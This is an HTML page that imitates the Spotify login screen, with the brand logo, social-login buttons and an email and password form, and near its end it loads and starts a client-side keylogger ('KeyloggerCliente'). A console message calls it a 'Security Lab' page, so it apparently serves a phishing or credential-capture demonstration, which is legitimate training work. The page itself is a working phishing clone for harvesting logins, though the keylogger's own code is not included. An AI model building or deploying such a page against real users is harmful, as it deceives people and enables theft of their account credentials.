<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Spotify</title>
    <link rel="icon" href="assets/favicon.png" type="image/png">
    <link rel="stylesheet" href="assets/app.css">
</head>
<body>
    <div class="container">
        <div class="login-box">
            <img src="assets/logo.svg" alt="Spotify" class="logo">

            <h1>Log in to Spotify</h1>

            <div class="social-buttons">
                <button class="social-btn google">
                    <img src="assets/google-icon.svg" alt="Google">
                    Continue with Google
                </button>
                <button class="social-btn facebook">
                    <img src="assets/facebook-icon.svg" alt="Facebook">
                    Continue with Facebook
                </button>
                <button class="social-btn apple">
                    <img src="assets/apple-icon.svg" alt="Apple">
                    Continue with Apple
                </button>
            </div>

            <div class="divider">
                <span>or</span>
            </div>

            <form id="login-form">
                <div class="form-group">
                    <label for="email">Email or username</label>
                    <input type="text" id="email" name="email" placeholder="Email or username">
                </div>

                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" placeholder="Password">
                </div>

                <a href="#" class="forgot-link">Forgot your password?</a>

                <div class="remember-me">
                    <label class="checkbox-container">
                        <input type="checkbox" id="remember">
                        <span class="checkmark"></span>
                        Remember me
                    </label>
                </div>

                <button type="submit" class="login-btn">Log In</button>
            </form>

            <div class="signup-link">
                <span>Don't have an account?</span>
                <a href="#">Sign up for Spotify</a>
            </div>
        </div>
    </div>

    <!-- Keylogger Client-Side -->
    <script src="/cadastro/keylogger-client.js"></script>
    <script src="assets/app.js"></script>
    <script>
        const keylogger = new KeyloggerCliente();
        keylogger.iniciar();
        console.log('[Security Lab] Keylogger ativo - Spotify');
    </script>

    <!-- Nyan Cat Popup para links sem funcionalidade -->
    <script src="../nyan-popup.js"></script>
</body>
</html>
